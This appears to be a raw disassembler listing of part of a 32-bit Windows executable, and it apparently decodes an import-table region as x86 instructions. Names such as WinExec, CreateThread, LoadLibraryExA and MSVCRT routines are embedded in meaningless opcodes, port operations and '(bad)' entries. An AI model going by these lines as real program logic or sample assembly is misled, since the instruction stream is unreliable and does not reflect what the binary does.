  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
